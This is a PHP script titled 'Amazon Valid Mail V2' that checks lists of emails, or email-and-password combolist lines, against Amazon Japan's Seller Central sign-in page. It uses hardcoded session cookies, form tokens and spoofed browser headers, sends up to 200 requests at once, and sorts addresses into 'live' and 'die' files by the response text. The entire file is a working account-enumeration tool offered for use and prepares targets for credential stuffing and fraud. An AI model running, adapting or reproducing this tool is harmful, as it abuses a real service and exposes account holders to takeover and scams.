<?php
//宝塔使用
//安装命令行解释器
//apt-get install php5-cli         

//[Debian 及类似系统]# yum install php-cli      

//[CentOS 及类似系统]
ini_set("memory_limit",-1);
set_time_limit(0);
date_default_timezone_set("Asia/Jakarta");
define("OS", strtolower(PHP_OS));

require_once "RollingCurl/RollingCurl.php";
require_once "RollingCurl/Request.php";

echo banner();

enterlist:
$listname = readline("Enter list : ");
if(empty($listname) || !file_exists($listname)) {
	echo"[?] list not found".PHP_EOL;
	goto enterlist;
}
else if($listname == "n") {
	echo "[?] list not found".PHP_EOL;
	goto enterlist;
}
$lists = array_unique(explode("\n", str_replace("\r", "", file_get_contents($listname))));
$savedir = readline("Save Results (default: results): ");
$dir = empty($savedir) ? "results" : $savedir;
if(!is_dir($dir)) mkdir($dir);
chdir($dir);
reqemail:
$reqemail = readline("Ratio Check per second (example: 10 max *200)? : ");
$reqemail = (empty($reqemail) || !is_numeric($reqemail) || $reqemail <= 0) ? 200 : $reqemail;
if($reqemail > 200) {
	echo "[!] max 200".PHP_EOL;
	goto reqemail;
}
else if($reqemail == "1") {
	echo "[!] Minimal 2".PHP_EOL;
	goto reqemail;
}
echo PHP_EOL;

$no = 0;
$total = count($lists);
$live = 0;
$die = 0;
$unknown = 0;
$c = 0;
$pecah=10000;
$pecah_list=array_chunk($lists, $pecah);
$tot=count($pecah_list);

for ($i=0;$i<$tot;$i++){
$rollingCurl = new \RollingCurl\RollingCurl();
foreach($pecah_list[$i] as $list){
	$c++;
	if(strpos($list, "|") !== false) list($email, $pwd) = explode("|", $list);
	else if(strpos($list, ":") !== false) list($email, $pwd) = explode(":", $list);
	else $email = $list;
	if(empty($email)) continue;
	$email = str_replace(" ", "", $email);
	$url = "https://sellercentral.amazon.co.jp/ap/signin?jembot=$email";
	$data = "appActionToken=CuurTMVj1fJrhnC1E6mk9d59zPwj3D&appAction=SIGNIN_PWD_COLLECT&subPageType=SignInClaimCollect&openid.return_to=ape%3AaHR0cHM6Ly93d3cuYW1hem9uLmNvLmpwL2dwL3lvdXJzdG9yZS9ob21lP2llPVVURjgmcmVmXz1yaGZfY3VzdHJlY19zaWduaW4%3D&prevRID=ape%3AV1o1Uk5RUEo0NjMxS05aNUJKN00%3D&workflowState=eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.EhhRGqJRIU4bqsgq8II7QmQRIk0SxkrTArdnCs3auy_NS0PnRfw2Nw.3G6N4LNCtfxJ8d9r.oHCRa1ae943Wjn5D5M_mPVxjcHRxHs75VOWP--Y4hzBJ3VBn5VRVolipZJsCOiY-po-NJzGUD9rUVr2pIL5QCazHhrDRBGHdwKSFYDf4N6Yz1gQAx3IOQcwiCAJ5d4h9gjSYMlX4wzuL0_L92SaFf5x-jyCSiTdh6JdFh6jDI-h3iL4j5SSXX7TFq790C0FBX-z3CXXA-TVrpR_PS1MtrZOocERlb58y7LhC2-FWY63lwjoYnjdlxsRXk2721cZE4RRWDYhLu6rfhVQp5USpuyb1r6slaq6eDqDRjC3CZLoVg_oFweFpvPjlXoidYEf0a7r3K0r24Bfhmxwe0T5VfWTTrh2smQGb8UVPu5kU0oOoNnq5e2H0B8NCxRifJR-r9YZ8M2eiAZqht9LyOa6L4KtMKIfpe75EHaW7PrAEh0R5r24t1t896pcA6Nxt9pT0UTTyfya3JckfXPVE3-sO-Gkl4-PkzE9G4eQ-x4BKm1mhdnDuxxWJpaFdlJ3Ok5VbjoK8kZzy_4eU_bqsktwv1zmPlw0cs-bP9cM00CRjC1OcAWtFA8qBzuZsspD7zlX_fB2CRW-_8pRuXa0bQP-dlSw_KEcDZsqR6nm9BGFT58kjMbwtE0aLJAh221lMP3ggoY3xuhZxkyF-kelqGkbP05oILtw3vyFaqicxmivv_-i45Hb6TodgxeYw3tO9g93Q5AW-JxOGPRQJs6nLv3qD3ftpDbyJQtXw-0KS0oGm-ie2788tfNeVW5QeZJivDfrW_RpusTuN1l5anTpCMGTbelu1pxADHMEkVdlsar9dwYTfh21t20IA5AuckcbrBrz6PqCEm9pSjNYC9s7V3HcJaIsbXQLFKc3H8reRSoWIjeO5WHM30xQ7M3-rPQ.zexZ49MowK_w4dfYd3pgVg&email=$email&password=&create=0&metadata1=ECdITeCs%3AoqDWlsrFoVOLUl71f3a%2BhAUU0WmuJl4x0ykaGLILZLlcgeizTpsMeqNsYUVZF7BoCgZtlbcqCRS3oLGzcuLABh79tUO%2Bx1Eq2YHOxT7iEuNHdVzPjlEN3XyINobo%2FQC9YhObMK6uNPlGROv2LBuQjmH5rclI7hnbF8wUGaaYnA8TwppqJXkI3IU5Ux43bKpX7btCCLkIecXvIxgA1rtkVhsb%2FiIg%2BOum%2B5VrMCAqhCYcpZX%2Bt%2F5PAV0JFTBVtisO0w0aRJoGBxNXhPAuhcLwyF%2BtIJzro1lX1G88kLjqklvWDhMNBGQ%2FzJCVVF9UlspQrcxD%2BNn3mouvu9JWLU6157z02M9zi4VI%2FHBWCzgv%2BuKRRXOvQg2KOSzAn6riiK%2BE2fvm7ufwiq%2FcJ5TB%2FdsaKZNOYGcAEWPczzFC%2BafeWv%2FVqsZQRDF8DKG5upSAG1vM9PCTahjowuSoLYCzrHCn0rkZh3UCsMfOluCbILKXZrLyAkL1fobvKHOmeNWxhfPy%2BUaNsfIvOr4F3JBV81kmhEVpDIKhHGUBAFWRrFaUoDmMQkKhQAzPh%2Fe%2FI%2BsZcAHQwEElH%2BQ6kg3Ajap7clrKTjXoAhod%2FCbw8YuEFtLIGt%2BaGUcPoJ7JQMrAnQpFNJMC1lhil%2BuGOort%2FunzD4q9P0%2B57QpZ3EUL3%2BmL9OUKR04CNdgE%2BxwOH6lMoXRmKqH3VSGMPZa84jRnk1fqMDWSwLKLmh9rJXaL9kbrECnUozaXc6%2FGUBcMSyGQXn9cNRnNPMlUbwmqDg5IM4g8MIwOX8pedEJnlSmxRrg7joRVSqEkMcPeyHpd2KLPlgPcidshVEtd2aLo49323qWSFGSeIY1rrM0cFWcbi9KXY7JvR%2FcdzmFKrBV4aAcXVwb84tOhJVElnmaWCwPcn6hCD5Qd9WOxgciWHsH%2FkqC8LcyRhWAs7v%2B68FIb3ZY%2BgtS3gmuIRyzFQI%2FM%2FnE6DcoZUaRMdrqYM%2BieEGzjedTgEYDHII2LW4WyPsxu68YGzqNBlcK0woFOrHCeIDRTCgUPOsJmksOdv48yWSOl3N32isSejhunsi9AJpou0DQbPo%2Fh6wwxi5DkFFspl6MX8tTcBfaISkeXKrQ9%2BB4%2BlSgyVuaAixSDlsoaXH5zLBV6AhqF7I%2FnkotLPtIwmmfjXMFnPGKXPynPB8wQaGJhf6eZJa9QNs6q8eRFy7jnbAPcZOJZ57PQGNm03rOFB4dBaTiVTgKyr7yXLaIB8TtbMUiMkxjmOrlwM7xb5JQfJ3jZyIIMmuUytuM3EHFBC2hakyjCUXmMplTfw6bkwwvbOXr7eGBaRqywtjGrMzmCO%2BxJN2PTYEtJronJEU8E2zQXRaxYxCqHc5na6wgshfTOXlUO0hAa5eA2VDU7h%2Bm79rXirKorhUiJmRLA1BRGo%2BoFNV5qjFjrPxZkHkQRZxZg885scfpdS6M6hAtZyk3QYJTJdh%2BwQHKdeU2r7nz4sImJFPipajR68UrvWF69h%2BG9neAQ8NL8FSl4o3Jq4QGCEKFDsLySPBVyPiCwuj0%2BHbovtolX4o2aTlHrUmNxvDpO1MkdphrUPtdzrlo8V6Pib6L%2F1PN0NWGWIf8znozYWzH1eVzOzK%2FSzaUJcOJqJpEmpNyzc2IsyeiCD0qEcEZe4pMIDr5q4d6X94mZD3RINzsthSX10byN6H6pIMUvuGhK0BtPnXRtBkqLeOwUx8HX4eOqDuuIpp%2FAE7b%2BWyO%2B2gqXyBjN9OergIso0PYNc0Zbzc2fRPclq%2BnAkKiejspQxFUKhuLfDPOP9j4SAWDprB0rpfs3z8pCy0fQvPa0XAgSrzgbSElQU3jozCdyOL7ToeIw%2FdR7vbCEnR6XfybO25%2BjOrWzRjlvbJLNImaEeLsFU1elFSn8h%2FXRo2vXtc0bVyN5zWe9UVh%2F4JsxfUEco8%2BF8p1UpuwAjp%2BzP5eZ9hun5v4bRWau%2BegYPjR91C5QKRLLkh3qpwenG0wRcGkXvEjt68F76q89DP6Xwl0AK%2BT%2BnyR8R5ENHNmt5009Q4t4K9XqJcpdqxbsK8rXXAkzUoyHKPsB%2FCj1cWLAQwafi9HLGRkbND2biq4fGxDoowlegiNk8KnfW5ro3PM3B%2Fuv%2FBUxEqPXnL3Trn4uH3P6eaxKe8cxPBLfDSJ5%2BSyVXAd%2BNxFpNS1mTblquKkMZwHnZx1CiO%2B80ddM7k7JEEGwynLRcsyjclt%2B8tDERfzOn6p0yH77plsC3P6crVzfr4%2FKXG8WvLria%2Fh9Tp%2BTBBWU3Cj4E7wqFvbLoV76mni6uWFRxLh65Oqs0utA4TrmnK8FG5xzYkvZiW7UHFvCiHq8fUVM2Fr5P%2BLvTTsgmaA37r6V38sZvYIwPtGviUxfVviUSFcx94PEDq5RAl3A%2B8qrfo4Kf%2Fa8tAOH926qn8yPF0TTcnhkadwHp5JUfCEsV%2BTGFWC9K3sdAQ1DmddRCa%2FYMots17Yc8gfxPKv%2BLk9tOxFyt78Hf27B%2Fg%2BcQfi8z6GmmQJ2al5ly%2BTruYDVZ14mJVFn7Cl2UA%3D%3D";
	$headers = array();
	$headers[] = 'Connection: keep-alive';
	$headers[] = 'Cache-Control: max-age=0';
	$headers[] = 'Origin: https://sellercentral.amazon.co.jp';
	$headers[] = 'Upgrade-Insecure-Requests: 1';
	$headers[] = 'Content-Type: application/x-www-form-urlencoded';
	$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36';
	$headers[] = 'Sec-Fetch-Dest: document';
	$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
	$headers[] = 'Sec-Fetch-Site: same-origin';
	$headers[] = 'Sec-Fetch-Mode: navigate';
	$headers[] = 'Sec-Fetch-User: ?1';
	$headers[] = 'Referer: https://sellercentral.amazon.co.jp/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=jpflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26ref_%3Drhf_custrec_signin&switch_account=openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fsellercentral.amazon.co.jp%2Fhome&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=sc_jp_amazon_v2&openid.mode=checkid_setup&language=en_JP&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&pageId=sc_jp_amazon_v2&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&ssoResponse=eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.kThtuXIx-d0fA6OS4L-UNEZ6Ysb5XVfeNKlkuba5fwDFksPWgK7qRQ.HQRSWg1q3qBr-I08.13mt9IeMJ1KJbAA0Jvm1tp6b4CVM8diZs_U46YT1YDVVIckBTtIGbAjPEG_-Cal15VCKFYBs_Mugn-oPx6sLj1p7f1bUBBdti_FWfFQ0cJG5OCYfpQ2Mtzo3dtHwaBlB9aCNN0op8sYHOQOCZSvTtlzhtRxqm35P90so-0E7U6MQcfdi4wpR1MTynqzjhSzr7Xj-xL1celWmpVj213vJSNIMmD_JybaDhwTMRIMxCVz-z2ops1xVG2-yHcNLOXaxeXo.49Z-QpCJaOKGBRxRQxOnBA';
	$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
	$headers[] = 'Cookie: session-id=358-1178030-4198254; i18n-prefs=JPY; ubid-acbjp=355-7577114-3876246; x-wl-uid=1LKPIVoRzR3corPNBuEKGmyuIsQoE3Qklx8ZpvezZuxhhRwe9Y48YiUY79f8hvABSjCVSg8aMh0Q=; session-token=eZkUhDrFBScBTLAB1ti0/aqinIWxzgh0XnUu5NAZ74c4s7tlPoRqkfwjKs/BFyWB8S+/XQLFCO935xIceIBagG+SS7bgWor0+yNb5jJ0GTXewd8lXGD1KytcbQeQvetCUQzzC5/2yrfCuTyhZrKOuJZMqDH1zpltdOFX+U2VAQjjGr4tZdZOLIKdy1+rhSHvI6xFCrhXP98gDXfrHlxiUJkdvH3N2CfF; lc-acbjp=en_JP; session-id-time=2213613776l; csm-hit=tb:SAFJ7CZ6E7SWGSK460JF+s-WZ5RNQPJ4631KNZ5BJ7M|1582893775100&t:1582893775100&adb:adblk_no';
$rollingCurl->setOptions(array(CURLOPT_ENCODING => "gzip",CURLOPT_RETURNTRANSFER => 1))->post($url, $data, $headers);
}	
$rollingCurl->setCallback(function(\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$results) {
	global $listname, $dir, $no,$pecah, $total, $live, $die, $unknown,$pisah;
	$no++;
	parse_str(parse_url($request->getUrl(), PHP_URL_QUERY), $params);
	$email = urldecode($params["jembot"]);
	$x = $request->getResponseText();
	echo "[".$no."/".$total."]-[".date("H:i:s")."]";
	echo color()["LGRN"]." LIVE = $live ".color()["LR"]." DIE = $die ".color()["WH"];
if (strpos($x,'We cannot find an account with that mobile number')){
	$die++;
		file_put_contents("si.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["LR"]." DIE".color()["WH"]." => ".$email;
}
elseif (strpos($x,'Enter your password')){
	$live++;
		file_put_contents("huo.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["GRN"]." LIVE".color()["WH"]." => ".$email;
}
else{
	$unknown++;
		file_put_contents("daiding.txt", $email.PHP_EOL, FILE_APPEND);
		echo color()["CY"]." Uknown".color()["WH"]." => ".$email;
}
	echo PHP_EOL;
})->setSimultaneousLimit((int) $reqemail)->execute();
}
echo PHP_EOL." -- Total: ".$total." - Live: ".$live." - Die: ".$die." - Unknown: ".$unknown." Saved to dir \"".$dir."\" -- ".PHP_EOL;

function banner() {
	$out = "\n\n--------- [!] Amazon Valid Mail V2 [!] ---------\n -------- Powered By SCID Family 2k20 -------\n\n\n";
	return $out;
}
function color() {
	return array(
		"LW" => (OS == "linux" ? "\e[1;37m" : ""),
		"WH" => (OS == "linux" ? "\e[0m" : ""),
		"YL" => (OS == "linux" ? "\e[1;33m" : ""),
		"LR" => (OS == "linux" ? "\e[1;31m" : ""),
		"MG" => (OS == "linux" ? "\e[0;35m" : ""),
		"LM" => (OS == "linux" ? "\e[1;35m" : ""),
		"CY" => (OS == "linux" ? "\e[1;36m" : ""),
		"LG" => (OS == "linux" ? "\e[1;32m" : ""),
		"GRN" => (OS == "linux" ? "\e[0;32m" : ""),
		"LGRN" => (OS == "linux" ? "\e[32;4m" : "")

	);
}
function getStr($source, $start, $end) {
    $a = explode($start, $source);
    $b = explode($end, $a[0]);
    return $b[0];
}

function random_array_value($arrX){
    @$randIndex = array_rand(@$arrX);
    return @$arrX[@$randIndex];
}
?>